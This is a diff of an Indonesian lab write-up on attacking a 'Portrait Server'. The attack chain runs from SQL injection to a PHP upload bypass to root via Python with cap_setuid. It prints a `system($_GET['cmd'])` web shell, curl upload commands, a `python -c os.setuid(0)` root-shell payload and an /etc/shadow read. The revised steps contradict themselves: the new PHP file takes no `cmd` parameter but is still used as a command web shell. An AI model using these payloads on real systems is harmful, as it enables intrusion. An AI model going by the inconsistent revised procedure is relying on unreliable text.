@@ -29,9 +29,10 @@
    - Validasi file hanya mengandalkan nama ekstensi atau MIME type dari klien.
    - File PHP dapat diunggah dengan teknik double extension dan kemudian dieksekusi oleh server.
 
-3. **SUID Binary Misconfiguration pada `/usr/local/bin/env`**
-   - Binary `env` dimiliki oleh `root` dan memiliki bit SUID.
-   - User biasa dapat menjalankan perintah dengan effective user ID milik `root`.
+3. **Linux Capability Misconfiguration pada Python**
+   - Binary Python memiliki capability `cap_setuid=ep`.
+   - Capability tersebut memungkinkan proses Python mengubah UID menjadi `0`.
+   - User `www-data` dapat menjalankan payload Python dan memperoleh shell sebagai `root`.
 
 ### Rangkaian Serangan
 
@@ -46,13 +47,15 @@ Mendapatkan kredensial administrator
       ↓
 Login dan mengakses fitur upload avatar
       ↓
-Upload web shell PHP
+Upload file PHP `cakgup.php`
       ↓
 Remote Command Execution sebagai www-data
       ↓
-Enumerasi SUID binary
+Enumerasi Linux capabilities
       ↓
-Eksploitasi /usr/local/bin/env
+Menemukan Python dengan `cap_setuid=ep`
+      ↓
+Menjalankan payload Python `os.setuid(0)`
       ↓
 Privilege Escalation menjadi root
 ```
@@ -94,21 +97,29 @@ uid=33(www-data) gid=33(www-data) euid=0(root)
 
 Walaupun UID masih `www-data`, proses memiliki EUID `0`, sehingga perintah berjalan dengan hak akses `root`.
 
-### 2.4 Apa Itu SUID?
+### 2.4 Apa Itu Linux Capability?
 
-SUID adalah permission khusus pada file executable Linux. Ketika binary dengan SUID dijalankan, proses menggunakan privilege pemilik file tersebut.
-
-Contoh:
+Linux capability membagi privilege `root` menjadi hak yang lebih kecil dan spesifik. Salah satu capability sensitif adalah:
 
 ```text
--rwsr-xr-x 1 root root 48192 /usr/local/bin/env
+cap_setuid
 ```
 
-Huruf `s` pada bagian permission pemilik menunjukkan bahwa bit SUID aktif.
+Capability tersebut mengizinkan proses mengubah user ID.
 
-Jika binary dimiliki oleh `root`, maka binary tersebut dapat berjalan dengan effective UID `root`.
+Pada target ditemukan Python dengan konfigurasi:
 
----
+```text
+/usr/bin/python3.13 cap_setuid=ep
+```
+
+Karena Python merupakan interpreter yang dapat menjalankan kode arbitrer, konfigurasi ini memungkinkan pemanggilan:
+
+```python
+os.setuid(0)
+```
+
+untuk mengubah UID proses menjadi `0`.
 
 ## 3. Phase 1 — Reconnaissance
 
@@ -388,165 +399,111 @@ SQL Injection memungkinkan attacker:
 
 ## 5. Phase 3 — File Upload Bypass
 
-Setelah mendapatkan akun administrator, attacker dapat mengakses halaman:
+Setelah memperoleh akun administrator, attacker dapat mengakses halaman:
 
 ```text
 /profile
 ```
 
-Halaman ini menyediakan fungsi upload avatar.
+Halaman tersebut menyediakan fungsi upload avatar.
 
 ---
 
 ### 5.1 Percobaan Awal
 
-File berikut ditolak:
-
-```text
-shell.php
-```
-
-Pesan aplikasi:
+Upload file PHP dapat ditolak dengan pesan:
 
 ```text
 Server only accepts JPG, PNG, GIF
 ```
 
-Hal ini menunjukkan aplikasi memiliki validasi file, tetapi belum tentu validasinya aman.
+Hal ini menunjukkan terdapat validasi file, tetapi validasinya masih perlu diuji karena aplikasi mungkin hanya memeriksa nama ekstensi atau MIME type dari klien.
 
 ---
 
-### 5.2 Membuat Web Shell Minimal
+### 5.2 Membuat Payload `cakgup.php`
+
+Payload privilege escalation yang digunakan adalah:
 
 ```bash
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
+python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 ```
 
-Isi file:
-
-```php
-<?php system($_GET["cmd"]); ?>
-```
-
-### Cara Kerja
-
-Parameter URL `cmd` diteruskan ke fungsi PHP `system()`.
-
-Contoh:
-
-```text
-shell.php?cmd=id
-```
-
-akan menjalankan:
+Karena file yang diunggah berekstensi `.php`, baris shell tersebut perlu dipanggil melalui PHP. Buat file `cakgup.php`:
 
 ```bash
-id
+cat > cakgup.php <<'PHP'
+<?php
+system("python -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'");
+?>
+PHP
 ```
 
-di server.
+Payload inti di dalam file tetap:
 
-> Web shell ini hanya digunakan untuk pembuktian pada laboratorium. Setelah pengujian selesai, file harus dihapus.
+```bash
+python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
+
+> Baris `python -c ...` tidak dapat dieksekusi sebagai PHP apabila ditulis tanpa tag PHP. Fungsi `system()` digunakan sebagai pembungkus agar command diproses oleh server.
 
 ---
 
-### 5.3 Bypass dengan Double Extension
+### 5.3 Upload File
 
-File diunggah dengan nama:
-
-```text
-marker118.php.jpg
-```
-
-Perintah:
+Contoh upload menggunakan session administrator:
 
 ```bash
 curl -X POST \
   http://192.168.56.118:8080/profile \
-  -F "avatar=@shell.php;filename=marker118.php.jpg;type=image/jpeg" \
+  -F "avatar=@cakgup.php;filename=cakgup.php;type=image/jpeg" \
   -b "PHPSESSID=<SESSION_ID>"
 ```
 
-Ganti:
+Ganti `<SESSION_ID>` dengan session administrator yang valid.
+
+Apabila aplikasi memeriksa ekstensi terakhir, nama sementara dapat diuji sebagai:
 
 ```text
-<SESSION_ID>
+cakgup.php.jpg
 ```
 
-dengan session ID yang diperoleh setelah login.
+Namun, file yang dirujuk dan dieksekusi pada write-up ini adalah:
 
-### Mengapa Dapat Berhasil?
+```text
+/uploads/cakgup.php
+```
+
+---
+
+### 5.4 Mengapa Upload Dapat Berhasil?
 
 Kemungkinan aplikasi hanya memeriksa:
 
-- ekstensi terakhir `.jpg`;
-- MIME type yang dikirim klien;
-- string nama file tanpa memverifikasi isi sebenarnya.
+- ekstensi file;
+- `Content-Type` dari request;
+- nama file yang diberikan klien;
+- string nama file tanpa memvalidasi isi sebenarnya.
 
-MIME type pada request HTTP dapat dimanipulasi oleh klien, sehingga tidak boleh dijadikan satu-satunya mekanisme validasi.
+MIME type dapat dimanipulasi oleh klien, sehingga tidak boleh digunakan sebagai satu-satunya validasi.
 
 ---
 
-### 5.4 Memeriksa Ekstensi yang Dieksekusi
+### 5.5 Mengakses Payload
 
-Contoh pengujian:
+Akses file:
+
+```text
+http://192.168.56.118:8080/uploads/cakgup.php
+```
+
+Ketika diproses oleh PHP, server menjalankan:
 
 ```bash
-for ext in php php3 php4 php5 phtml phar inc pht phps; do
-  echo "Testing marker118.$ext"
-  curl -s \
-    "http://192.168.56.118:8080/uploads/marker118.$ext?cmd=id"
-done
+python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 ```
 
-Hasil pengujian:
-
-```text
-marker118.php   -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
-marker118.php3  -> source code tidak dieksekusi
-marker118.phtml -> uid=33(www-data) ...
-marker118.phar  -> uid=33(www-data) ...
-marker118.phps  -> 403 Forbidden
-```
-
-### Temuan Penting
-
-Server mengeksekusi beberapa ekstensi sebagai PHP:
-
-```text
-.php
-.phtml
-.phar
-```
-
-Hal ini memperbesar kemungkinan bypass validasi upload.
-
----
-
-### 5.5 Verifikasi Remote Command Execution
-
-Web shell yang berhasil diakses:
-
-```text
-http://192.168.56.118:8080/uploads/marker118.php
-```
-
-Pengujian:
-
-```bash
-curl \
-  "http://192.168.56.118:8080/uploads/marker118.php?cmd=id"
-```
-
-Hasil:
-
-```text
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-Artinya, perintah sistem operasi berhasil dijalankan sebagai user `www-data`.
-
----
+Payload hanya akan berhasil memperoleh privilege `root` apabila binary Python memiliki capability `cap_setuid`.
 
 ## 6. Phase 4 — System Enumeration
 
@@ -555,7 +512,7 @@ Setelah memperoleh command execution, langkah berikutnya adalah memahami lingkun
 Definisikan URL web shell:
 
 ```bash
-BASE_URL="http://192.168.56.118:8080/uploads/marker118.php"
+BASE_URL="http://192.168.56.118:8080/uploads/cakgup.php"
 ```
 
 Karena perintah dikirim melalui URL, karakter khusus perlu diubah menjadi URL encoding.
@@ -702,198 +659,166 @@ curl -sG \
 Contoh hasil:
 
 ```text
--rw-r--r-- 1 www-data www-data 31 Jul 11 23:13 marker118.php
--rw-r--r-- 1 www-data www-data 31 Jul 11 23:13 marker118.inc
+-rw-r--r-- 1 www-data www-data 31 Jul 11 23:13 cakgup.php
+-rw-r--r-- 1 www-data www-data 31 Jul 11 23:13 cakgup.inc
 ```
 
 ---
 
-### 6.5 Pemeriksaan SUID Binary
-
-```bash
-curl -sG \
-  --data-urlencode \
-  "cmd=find / -perm -4000 -type f 2>/dev/null" \
-  "$BASE_URL"
-```
-
-### Penjelasan Perintah
-
-| Bagian | Fungsi |
-|---|---|
-| `find /` | Mencari dari root filesystem |
-| `-perm -4000` | Mencari file dengan bit SUID |
-| `-type f` | Hanya file biasa |
-| `2>/dev/null` | Menyembunyikan pesan error permission denied |
-
-Hasil penting:
-
-```text
-/usr/local/bin/env
-/usr/bin/pkexec
-/usr/bin/sudo
-/usr/bin/passwd
-/usr/bin/mount
-/usr/bin/umount
-```
-
-### Analisis
-
-Tidak semua binary SUID otomatis dapat dieksploitasi.
-
-Binary standar seperti `passwd`, `mount`, atau `sudo` memang dapat memiliki SUID karena membutuhkan operasi tertentu dengan privilege tinggi.
-
-Temuan yang tidak biasa adalah:
-
-```text
-/usr/local/bin/env
-```
-
-Binary `env` umumnya tidak memerlukan SUID root.
-
----
-
-## 7. Phase 5 — Privilege Escalation melalui SUID `env`
-
-### 7.1 Memeriksa Permission Binary
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=ls -la /usr/local/bin/env" \
-  "$BASE_URL"
-```
-
-Hasil:
-
-```text
--rwsr-xr-x 1 root root 48192 /usr/local/bin/env
-```
-
-### Interpretasi Permission
-
-```text
--rwsr-xr-x
-```
-
-- `rwx` untuk pemilik;
-- huruf `s` menggantikan `x` pada permission pemilik;
-- pemilik file adalah `root`;
-- binary akan dijalankan dengan effective UID `root`.
-
----
-
-### 7.2 Membuktikan Effective UID Root
+### 6.5 Pemeriksaan Linux Capabilities
 
 Jalankan:
 
 ```bash
+getcap -r / 2>/dev/null
+```
+
+Jika command dijalankan melalui web shell:
+
+```bash
 curl -sG \
-  --data-urlencode "cmd=/usr/local/bin/env id" \
+  --data-urlencode "cmd=getcap -r / 2>/dev/null" \
   "$BASE_URL"
+```
+
+Hasil penting:
+
+```text
+/usr/bin/python3.13 cap_setuid=ep
+```
+
+### Penjelasan
+
+| Bagian | Fungsi |
+|---|---|
+| `getcap -r /` | Memeriksa capability file secara rekursif |
+| `2>/dev/null` | Menyembunyikan error permission denied |
+| `cap_setuid=ep` | Capability SETUID aktif pada permitted dan effective set |
+
+### Analisis
+
+Temuan tersebut tidak normal untuk interpreter umum. Python dapat menjalankan kode arbitrer, termasuk:
+
+```python
+os.setuid(0)
+```
+
+Karena `cap_setuid` aktif, proses Python dapat mengubah UID menjadi `0`.
+
+## 7. Phase 5 — Privilege Escalation melalui Python `cap_setuid`
+
+### 7.1 Memastikan Capability Python
+
+```bash
+getcap /usr/bin/python3.13
 ```
 
 Hasil:
 
 ```text
-uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+/usr/bin/python3.13 cap_setuid=ep
 ```
 
-### Bukti Keberhasilan
+Periksa apakah command `python` mengarah ke binary tersebut:
 
-Bagian terpenting adalah:
-
-```text
-euid=0(root)
+```bash
+command -v python
+readlink -f "$(command -v python)"
 ```
-
-Hal ini membuktikan bahwa command dijalankan dengan effective privilege root.
 
 ---
 
-### 7.3 Menjalankan Shell dengan Privilege Dipertahankan
+### 7.2 Menjalankan Payload
+
+Jalankan payload:
 
 ```bash
-curl -sG \
-  --data-urlencode \
-  "cmd=/usr/local/bin/env /bin/bash -p -c 'id; whoami'" \
-  "$BASE_URL"
+python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
+
+Apabila target hanya menyediakan `python3.13`, jalankan binary yang memiliki capability:
+
+```bash
+/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
+
+### Cara Kerja
+
+```python
+import os
+```
+
+memuat modul sistem operasi.
+
+```python
+os.setuid(0)
+```
+
+mengubah UID proses menjadi `0`.
+
+```python
+os.execl("/bin/sh", "sh")
+```
+
+mengganti proses Python dengan `/bin/sh`.
+
+---
+
+### 7.3 Verifikasi Root
+
+```bash
+id
+whoami
 ```
 
 Hasil yang diharapkan:
 
 ```text
-uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+uid=0(root) gid=33(www-data) groups=33(www-data)
 root
 ```
 
-### Fungsi Opsi `-p`
+Indikator terpenting adalah `uid=0(root)` atau `euid=0(root)`.
 
-Pada Bash, opsi:
+---
+
+### 7.4 Validasi Non-Destruktif
+
+Gunakan:
+
+```bash
+id
+whoami
+hostname
+```
+
+Jangan mengubah password, SSH key, user, cron job, atau konfigurasi sistem kecuali diwajibkan oleh skenario laboratorium.
+
+## 8. Mengapa `cap_setuid` pada Python Berbahaya?
+
+Python merupakan interpreter serbaguna yang dapat menjalankan kode arbitrer.
+
+Ketika Python memiliki:
 
 ```text
--p
+cap_setuid=ep
 ```
 
-digunakan untuk mempertahankan effective privilege ketika shell dijalankan dari binary SUID.
-
-Tanpa opsi tersebut, shell tertentu dapat menurunkan privilege sebagai mekanisme keamanan.
-
----
-
-### 7.4 Validasi Akses Root secara Aman
-
-Gunakan command non-destruktif:
-
-```bash
-curl -sG \
-  --data-urlencode \
-  "cmd=/usr/local/bin/env /bin/bash -p -c 'id; whoami; head -n 3 /etc/shadow'" \
-  "$BASE_URL"
-```
-
-Membaca `/etc/shadow` hanya dimaksudkan sebagai bukti bahwa proses memiliki privilege tinggi. Jangan mengubah file sistem, password, SSH key, atau konfigurasi lain kecuali memang disyaratkan dalam laboratorium.
-
-### Indikator Keberhasilan
-
-Privilege escalation dinyatakan berhasil apabila:
-
-1. `id` menampilkan `euid=0(root)`;
-2. `whoami` menampilkan `root`;
-3. proses dapat membaca resource yang hanya dapat diakses root.
-
----
-
-## 8. Mengapa SUID `env` Berbahaya?
-
-Fungsi utama `env` adalah:
-
-- menampilkan environment variable;
-- mengubah environment untuk proses baru;
-- menjalankan command lain.
-
-Contoh penggunaan normal:
-
-```bash
-env VAR=value command
-```
-
-Ketika `env` memiliki SUID root, command yang dipanggil dapat mewarisi effective privilege root.
-
-Secara konseptual:
+kode Python dapat meminta perubahan UID proses menjadi `0`.
 
 ```text
 www-data
-   ↓ menjalankan
-SUID-root /usr/local/bin/env
-   ↓ menjalankan
-/bin/bash -p
    ↓
-euid=0(root)
+Python dengan cap_setuid
+   ↓
+os.setuid(0)
+   ↓
+/bin/sh
+   ↓
+root
 ```
 
-Binary yang dapat menjalankan command lain tidak boleh diberikan SUID root tanpa alasan teknis yang sangat kuat.
-
----
+Capability sensitif tidak boleh diberikan kepada interpreter umum seperti Python, Perl, Ruby, atau shell.
 
 ## 9. Attack Path Lengkap
 
@@ -911,29 +836,28 @@ Login form rentan terhadap SQL Injection.
 SQLMap mengekstrak akun administrator dari database portrait.
 ```
 
-### Tahap 3 — Remote Command Execution
+### Tahap 3 — File Upload dan Execution
 
 ```text
-Akun administrator membuka akses ke halaman upload.
-Validasi upload dilewati dengan double extension.
-File PHP disimpan di direktori yang dapat diakses dan dieksekusi melalui web.
+Akun administrator membuka akses ke fitur upload.
+File cakgup.php berhasil ditempatkan pada /uploads.
+Apache/PHP memproses file tersebut sebagai script.
 ```
 
 ### Tahap 4 — Local Enumeration
 
 ```text
-Web shell berjalan sebagai www-data.
-Enumerasi filesystem menemukan /usr/local/bin/env dengan SUID root.
+Akses awal berjalan sebagai www-data.
+Perintah getcap menemukan Python dengan cap_setuid=ep.
 ```
 
 ### Tahap 5 — Root Privilege
 
 ```text
-/usr/local/bin/env menjalankan /bin/bash -p.
-Proses memperoleh euid=0(root).
+Payload Python memanggil os.setuid(0).
+Python mengganti proses dengan /bin/sh.
+Shell memperoleh UID atau EUID 0.
 ```
-
----
 
 ## 10. Root Cause Analysis
 
@@ -1014,54 +938,43 @@ Contoh konfigurasi Apache untuk mencegah eksekusi PHP di direktori upload:
 
 ---
 
-### 10.3 SUID Misconfiguration
+### 10.3 Linux Capability Misconfiguration
 
-Penyebab:
+Penyebab privilege escalation adalah:
 
-```bash
-chmod u+s /usr/local/bin/env
+```text
+/usr/bin/python3.13 cap_setuid=ep
 ```
 
-atau binary disalin ke `/usr/local/bin` dengan permission yang tidak aman.
+Capability `cap_setuid` tidak seharusnya diberikan kepada interpreter umum.
 
 #### Perbaikan Langsung
 
+Hapus capability:
+
 ```bash
-sudo chmod u-s /usr/local/bin/env
+sudo setcap -r /usr/bin/python3.13
 ```
 
 Verifikasi:
 
 ```bash
-ls -l /usr/local/bin/env
+getcap /usr/bin/python3.13
 ```
 
-Permission yang diharapkan:
+Output seharusnya kosong.
 
-```text
--rwxr-xr-x
-```
-
-Jika file tidak dibutuhkan:
+Audit seluruh capability:
 
 ```bash
-sudo rm /usr/local/bin/env
+getcap -r / 2>/dev/null
 ```
-
-Bandingkan dengan binary resmi:
-
-```bash
-command -v env
-ls -l /usr/bin/env
-```
-
----
 
 ## 11. Rekomendasi Keamanan
 
 ### Prioritas Kritis
 
-1. Hapus bit SUID dari `/usr/local/bin/env`.
+1. Hapus capability `cap_setuid` dari binary Python.
 2. Hapus seluruh web shell dan file upload berbahaya.
 3. Perbaiki SQL Injection menggunakan prepared statement.
 4. Reset password administrator dan session aktif.
@@ -1077,10 +990,10 @@ ls -l /usr/bin/env
 5. Tinjau log Apache, PHP, dan database untuk mencari aktivitas serupa.
 6. Periksa apakah terdapat persistence seperti cron job, SSH key, atau user baru.
 
-### Pemeriksaan SUID Berkala
+### Pemeriksaan Capability Berkala
 
 ```bash
-find / -xdev -perm -4000 -type f -ls 2>/dev/null
+getcap -r / 2>/dev/null
 ```
 
 Simpan baseline hasil pemeriksaan dan bandingkan secara berkala.
@@ -1094,16 +1007,16 @@ Dalam laboratorium, lakukan pembersihan agar target kembali ke kondisi semula.
 ### Menghapus Web Shell
 
 ```bash
-rm -f /var/www/portrait/uploads/marker118.php
-rm -f /var/www/portrait/uploads/marker118.inc
-rm -f /var/www/portrait/uploads/marker118.phtml
-rm -f /var/www/portrait/uploads/marker118.phar
+rm -f /var/www/portrait/uploads/cakgup.php
+rm -f /var/www/portrait/uploads/cakgup.php.jpg
+rm -f /var/www/portrait/uploads/cakgup.phtml
+rm -f /var/www/portrait/uploads/cakgup.phar
 ```
 
-### Menghapus SUID yang Tidak Aman
+### Menghapus Capability yang Tidak Aman
 
 ```bash
-chmod u-s /usr/local/bin/env
+setcap -r /usr/bin/python3.13
 ```
 
 ### Menghapus Session Lama
@@ -1172,36 +1085,35 @@ curl -sG \
 
 ---
 
-### 13.4 `bash -p` Tidak Memberikan Root
+### 13.4 Payload Python Tidak Memberikan Root
 
-Periksa:
+Periksa capability:
 
 ```bash
-/usr/local/bin/env id
+getcap "$(command -v python)"
+getcap /usr/bin/python3.13
 ```
 
-Jika tidak muncul:
+Jika tidak muncul `cap_setuid=ep`, payload `os.setuid(0)` tidak memiliki privilege yang dibutuhkan.
 
-```text
-euid=0(root)
+Periksa lokasi binary:
+
+```bash
+readlink -f "$(command -v python)"
 ```
 
-maka kemungkinan:
+Gunakan binary yang benar-benar memiliki capability:
 
-- bit SUID telah dihapus;
-- filesystem menggunakan opsi `nosuid`;
-- binary bukan milik root;
-- binary menghapus privilege sebelum menjalankan command;
-- hardening sistem mencegah pewarisan privilege.
+```bash
+/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
 
----
-
-### 13.5 Perintah `find` Menghasilkan Banyak Error
+### 13.5 Perintah `getcap` Menghasilkan Banyak Error
 
 Arahkan standard error ke `/dev/null`:
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
 ```
 
 ---
@@ -1218,27 +1130,26 @@ Database aktif: portrait
 User database: portrait_app@localhost
 ```
 
-### Bukti 2 — Remote Command Execution
+### Bukti 2 — File Upload dan Execution
 
 ```text
-URL: /uploads/marker118.php?cmd=id
-Output:
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+URL: /uploads/cakgup.php
+Payload:
+python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 ```
 
-### Bukti 3 — SUID Misconfiguration
+### Bukti 3 — Capability Misconfiguration
 
 ```text
--rwsr-xr-x 1 root root 48192 /usr/local/bin/env
+/usr/bin/python3.13 cap_setuid=ep
 ```
 
 ### Bukti 4 — Privilege Escalation
 
 ```text
-uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+uid=0(root)
+root
 ```
-
----
 
 ## 15. Ringkasan Risiko
 
@@ -1246,7 +1157,7 @@ uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 |---|---|---|
 | SQL Injection | Bypass login dan ekstraksi database | Critical |
 | Unrestricted File Upload | Remote Command Execution | Critical |
-| SUID `env` Misconfiguration | Local Privilege Escalation menjadi root | Critical |
+| Python `cap_setuid` Misconfiguration | Local Privilege Escalation menjadi root | Critical |
 
 Ketiga kerentanan membentuk attack chain yang memungkinkan attacker berpindah dari akses web tanpa privilege menjadi kendali penuh atas sistem operasi.
 
@@ -1258,7 +1169,7 @@ Ketiga kerentanan membentuk attack chain yang memungkinkan attacker berpindah da
 2. Validasi upload harus memeriksa isi file, bukan hanya nama dan MIME type.
 3. Direktori upload tidak boleh mengeksekusi script.
 4. User web server harus memiliki privilege minimum.
-5. Binary SUID yang dapat menjalankan command lain merupakan risiko sangat tinggi.
+5. Capability sensitif pada interpreter umum merupakan risiko sangat tinggi.
 6. Misconfiguration sederhana dapat lebih mudah dieksploitasi daripada kerentanan kernel.
 7. Selalu lakukan cleanup setelah pengujian.
 8. Catat command, output, waktu, dan bukti agar hasil pengujian dapat direproduksi.
@@ -1292,14 +1203,15 @@ Ketiga kerentanan membentuk attack chain yang memungkinkan attacker berpindah da
 
 - [x] Identifikasi user saat ini
 - [x] Identifikasi OS dan kernel
-- [x] Enumerasi SUID binary
-- [x] Analisis `/usr/local/bin/env`
-- [x] Verifikasi `euid=0(root)`
+- [x] Enumerasi Linux capabilities
+- [x] Analisis Python dengan `cap_setuid=ep`
+- [x] Jalankan payload `os.setuid(0)`
+- [x] Verifikasi `uid=0(root)` atau `euid=0(root)`
 
 ### Cleanup
 
 - [ ] Hapus web shell
-- [ ] Hapus bit SUID tidak sah
+- [ ] Hapus capability tidak sah
 - [ ] Reset kredensial
 - [ ] Invalidasi session
 - [ ] Audit log dan persistence
@@ -1308,17 +1220,29 @@ Ketiga kerentanan membentuk attack chain yang memungkinkan attacker berpindah da
 
 ## 18. Kesimpulan
 
-Portrait Server memiliki tiga kerentanan kritis yang saling berhubungan.
+Portrait Server memiliki rangkaian kerentanan kritis yang saling berhubungan.
 
-SQL Injection pada halaman login memungkinkan attacker memperoleh akses administrator. Akses tersebut membuka fitur upload yang validasinya dapat dilewati, sehingga attacker dapat mengunggah dan mengeksekusi web shell sebagai `www-data`.
+SQL Injection pada halaman login memungkinkan attacker memperoleh akses administrator. Akses tersebut membuka fitur upload yang validasinya dapat dilewati, sehingga file `cakgup.php` dapat ditempatkan pada direktori `/uploads` dan diproses oleh PHP.
 
-Setelah melakukan enumerasi lokal, ditemukan `/usr/local/bin/env` dengan bit SUID dan kepemilikan `root`. Karena `env` dapat menjalankan command lain, attacker dapat menjalankan Bash dengan effective UID `0` dan memperoleh akses root.
+Payload yang digunakan adalah:
 
-Akar permasalahan bukan hanya satu bug, melainkan kombinasi antara:
+```bash
+python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
 
-- input SQL yang tidak aman;
+Privilege escalation berhasil karena binary Python memiliki capability:
+
+```text
+cap_setuid=ep
+```
+
+Capability tersebut memungkinkan proses Python menjalankan `os.setuid(0)` dan mengganti proses dengan `/bin/sh`, sehingga shell memperoleh UID atau EUID `0`.
+
+Akar permasalahan adalah kombinasi:
+
+- SQL Injection;
 - validasi upload yang lemah;
-- konfigurasi web server yang mengizinkan eksekusi script pada direktori upload;
-- kesalahan konfigurasi permission sistem operasi.
+- eksekusi PHP pada direktori upload;
+- capability `cap_setuid` pada interpreter Python.
 
-Penerapan prepared statement, validasi upload berbasis isi file, pemisahan direktori upload dari web root, least privilege, serta audit SUID berkala dapat memutus seluruh attack chain tersebut.
+Prepared statement, validasi file berbasis isi, penyimpanan upload di luar web root, penonaktifan eksekusi script pada direktori upload, dan audit capability secara berkala dapat memutus attack chain tersebut.
